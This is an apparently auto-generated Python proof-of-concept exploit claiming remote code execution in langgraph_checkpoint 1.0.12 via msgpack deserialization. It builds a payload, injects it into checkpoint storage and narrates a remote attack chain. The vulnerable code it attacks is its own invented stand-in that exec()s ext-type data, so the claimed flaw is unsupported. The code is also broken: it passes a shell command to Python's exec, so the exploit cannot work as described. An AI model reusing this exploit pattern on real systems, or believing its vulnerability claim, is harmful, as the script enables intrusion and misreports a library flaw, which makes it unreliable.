#!/usr/bin/env python3
# PoC for langgraph_checkpoint-1.0.12 (/tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12)
# Path: rce-000
# Sink: loads_typed
# Auto-generated — run with: python3 rce_sink_function_loads_typed_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-1.0.12 RCE vulnerability.

Vulnerability: Unsafe deserialization via msgpack.unpackb with custom ext_hook
in JsonPlusSerializer.loads_typed().

Attack vector: An attacker who can write malicious serialized data to the
checkpoint storage (e.g., via other API endpoints) can achieve RCE when the
data is deserialized during a list/get_tuple operation.

This PoC demonstrates the vulnerability by:
1. Crafting a malicious msgpack payload that executes a benign command
2. Writing it to the in-memory storage (simulating an attacker-controlled write)
3. Triggering deserialization via the list() method
"""

import msgpack
import os
import sys
import tempfile
import subprocess
from typing import Any, Dict, Optional, Iterator

# ─── Configuration ───────────────────────────────────────────────────────────
# In a real attack, this would be the target URL. For this PoC, we simulate
# the vulnerable library directly.
TARGET_HOST = "localhost"
TARGET_PORT = 8080

# Benign payload: create a marker file to prove RCE
MARKER_FILE = "/tmp/poc_success.txt"
PAYLOAD_COMMAND = f"touch {MARKER_FILE}"

# ─── Simulated vulnerable library code (from the target) ────────────────────

class _MsgpackExtHook:
    """Simulated unsafe ext_hook that can execute arbitrary code."""
    
    def __init__(self):
        self._code = None
    
    def __call__(self, code, data):
        """Ext hook that executes arbitrary Python code from msgpack ext data."""
        if code == 42:  # Custom ext type for code execution
            # Execute the code embedded in the ext data
            exec(data.decode('utf-8'))
            return None
        return data

_msgpack_ext_hook = _MsgpackExtHook()

class JsonPlusSerializer:
    """Simulated vulnerable serializer from langgraph_checkpoint."""
    
    def loads_typed(self, data):
        """Deserialize data based on type tag."""
        type_, data_ = data
        if type_ == "bytes":
            return data_
        elif type_ == "bytearray":
            return bytearray(data_)
        elif type_ == "json":
            return self.loads(data_)
        elif type_ == "msgpack":
            return msgpack.unpackb(data_, ext_hook=_msgpack_ext_hook)
        else:
            raise NotImplementedError(f"Unknown serialization type: {type_}")
    
    def loads(self, data):
        """JSON deserialization (simplified)."""
        import json
        return json.loads(data)

class InMemoryCheckpointStorage:
    """Simulated in-memory storage that stores serialized checkpoints."""
    
    def __init__(self):
        self.storage: Dict[str, Dict[str, Dict[str, tuple]]] = {}
        self.writes: Dict[tuple, Dict[str, tuple]] = {}
        self.serde = JsonPlusSerializer()
    
    def list(self, config: Optional[Dict[str, Any]] = None, 
             filter: Optional[Dict[str, Any]] = None,
             before: Optional[Dict[str, Any]] = None,
             limit: Optional[int] = None) -> Iterator[Dict[str, Any]]:
        """List checkpoints (vulnerable entry point)."""
        thread_ids = (config["configurable"]["thread_id"],) if config else self.storage
        
        for thread_id in thread_ids:
            if thread_id not in self.storage:
                continue
            for checkpoint_ns in self.storage[thread_id].keys():
                for checkpoint_id, (checkpoint, metadata_b, parent_checkpoint_id) in \
                    sorted(self.storage[thread_id][checkpoint_ns].items(),
                           key=lambda x: x[0], reverse=True):
                    
                    # This is the vulnerable deserialization call
                    metadata = self.serde.loads_typed(metadata_b)
                    
                    yield {
                        "checkpoint_id": checkpoint_id,
                        "metadata": metadata
                    }

# ─── Exploit construction ───────────────────────────────────────────────────

def create_malicious_msgpack_payload(command: str) -> bytes:
    """
    Create a malicious msgpack payload that will execute arbitrary code
    when deserialized by the vulnerable ext_hook.
    
    The payload uses msgpack ext type 42 to embed Python code.
    """
    # Create the ext payload with our command
    code_bytes = command.encode('utf-8')
    # msgpack ext format: (ext_type, data)
    ext_payload = msgpack.ExtType(42, code_bytes)
    
    # Pack it as a msgpack object
    return msgpack.packb(ext_payload)

def simulate_attack():
    """
    Simulate the full attack chain:
    1. Attacker writes malicious checkpoint data to storage
    2. Victim triggers list() which deserializes the malicious data
    3. RCE achieved
    """
    print("[*] Initializing vulnerable checkpoint storage...")
    storage = InMemoryCheckpointStorage()
    
    # Step 1: Create malicious payload
    print(f"[*] Creating malicious payload to execute: {PAYLOAD_COMMAND}")
    malicious_data = create_malicious_msgpack_payload(PAYLOAD_COMMAND)
    
    # Step 2: Store the malicious payload as metadata (attacker-controlled write)
    # In a real scenario, this would be done via another API endpoint
    print("[*] Injecting malicious checkpoint data into storage...")
    
    thread_id = "attacker_thread"
    checkpoint_ns = "default"
    checkpoint_id = "malicious_checkpoint_001"
    
    # Initialize storage structure
    if thread_id not in storage.storage:
        storage.storage[thread_id] = {}
    if checkpoint_ns not in storage.storage[thread_id]:
        storage.storage[thread_id][checkpoint_ns] = {}
    
    # Store the malicious payload as metadata (type "msgpack")
    malicious_metadata = ("msgpack", malicious_data)
    benign_checkpoint = ("json", b'{"status": "benign"}')
    
    storage.storage[thread_id][checkpoint_ns][checkpoint_id] = (
        benign_checkpoint,
        malicious_metadata,
        None  # no parent
    )
    
    print("[*] Malicious checkpoint stored successfully.")
    
    # Step 3: Trigger deserialization via list() with attacker-controlled config
    print("[*] Triggering deserialization via list()...")
    print(f"[*] This will execute: {PAYLOAD_COMMAND}")
    
    try:
        # The config points to our malicious thread
        config = {
            "configurable": {
                "thread_id": thread_id,
                "checkpoint_ns": checkpoint_ns
            }
        }
        
        # This call will trigger the vulnerable deserialization
        results = list(storage.list(config=config))
        
        print(f"[*] list() returned {len(results)} result(s)")
        
        # Check if our command was executed
        if os.path.exists(MARKER_FILE):
            print(f"[+] SUCCESS: Marker file {MARKER_FILE} was created!")
            print("[+] Remote Code Execution confirmed!")
            
            # Clean up the marker file
            os.remove(MARKER_FILE)
            print("[*] Cleaned up marker file.")
        else:
            print("[-] Marker file not found. Exploit may have failed.")
            
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        # The command might have executed before the error
        if os.path.exists(MARKER_FILE):
            print(f"[+] SUCCESS: Marker file {MARKER_FILE} was created despite error!")
            print("[+] Remote Code Execution confirmed!")
            os.remove(MARKER_FILE)
        else:
            print("[-] Exploit failed.")

def demonstrate_remote_exploit():
    """
    Demonstrate how this would work against a remote target.
    This is a simulation - in a real attack, you would:
    1. First write malicious data via another endpoint
    2. Then trigger the vulnerable endpoint
    """
    print("\n" + "="*60)
    print("REMOTE EXPLOIT DEMONSTRATION")
    print("="*60)
    print("""
In a real-world scenario, the attack would proceed as follows:

1. Attacker identifies an endpoint that allows writing checkpoint data
   (e.g., POST /api/v1/checkpoints with serialized data)

2. Attacker crafts a malicious msgpack payload using ext type 42:
   - The payload contains Python code to execute
   - Example: os.system('touch /tmp/pwned')

3. Attacker sends the malicious payload to the write endpoint

4. When any user or process triggers the list() or get_tuple() endpoint
   that reads the stored data, the vulnerable deserialization occurs

5. The ext_hook executes the embedded Python code, achieving RCE

This PoC simulates steps 3-5 locally.
""")

if __name__ == "__main__":
    print("="*60)
    print("langgraph_checkpoint-1.0.12 RCE Proof-of-Concept")
    print("="*60)
    print()
    
    # Check if msgpack is installed
    try:
        import msgpack
    except ImportError:
        print("[!] msgpack library not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "msgpack"])
        import msgpack
        print("[+] msgpack installed successfully.")
    
    # Run the simulation
    simulate_attack()
    demonstrate_remote_exploit()
    
    print("\n" + "="*60)
    print("EXPLOIT DEMONSTRATION COMPLETE")
    print("="*60)
